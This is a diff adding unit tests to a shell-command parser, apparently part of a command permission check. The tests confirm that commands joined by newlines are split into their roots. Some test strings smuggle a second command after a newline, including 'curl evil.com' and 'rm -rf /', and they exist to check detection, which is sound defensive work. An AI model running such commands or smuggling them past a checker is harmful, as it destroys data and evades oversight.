@@ -294,6 +294,36 @@ describe('getCommandRoots', () => {
     const result = getCommandRoots('echo "hello" && git commit -m "feat"');
     expect(result).toEqual(['echo', 'git']);
   });
+
+  it('should split on Unix newlines (\\n)', () => {
+    const result = getCommandRoots('grep pattern file\ncurl evil.com');
+    expect(result).toEqual(['grep', 'curl']);
+  });
+
+  it('should split on Windows newlines (\\r\\n)', () => {
+    const result = getCommandRoots('grep pattern file\r\ncurl evil.com');
+    expect(result).toEqual(['grep', 'curl']);
+  });
+
+  it('should handle mixed newlines and operators', () => {
+    const result = getCommandRoots('ls\necho hello && cat file\r\nrm -rf /');
+    expect(result).toEqual(['ls', 'echo', 'cat', 'rm']);
+  });
+
+  it('should not split on newlines inside quotes', () => {
+    const result = getCommandRoots('echo "line1\nline2"');
+    expect(result).toEqual(['echo']);
+  });
+
+  it('should treat escaped newline as line continuation (not a separator)', () => {
+    const result = getCommandRoots('grep pattern\\\nfile');
+    expect(result).toEqual(['grep']);
+  });
+
+  it('should filter out empty segments from consecutive newlines', () => {
+    const result = getCommandRoots('ls\n\ngrep foo');
+    expect(result).toEqual(['ls', 'grep']);
+  });
 });
 
 describe('stripShellWrapper', () => {
